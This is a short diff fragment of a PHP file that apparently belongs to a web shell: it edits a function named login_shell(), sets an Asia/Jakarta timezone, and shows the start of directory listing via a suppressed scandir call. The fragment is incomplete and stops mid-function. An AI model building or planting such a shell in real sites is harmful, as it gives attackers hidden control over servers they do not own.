@@ -18,9 +18,9 @@ $default_charset = 'UTF-8';
 date_default_timezone_set("Asia/Jakarta");
 function login_shell()
 {
-
-    $folders = []; 
-    $files = []; 
+?>
+    <!DOCTYPE html>
+    <html lang="en">
  
     try { 
         $items = @scandir($path); 
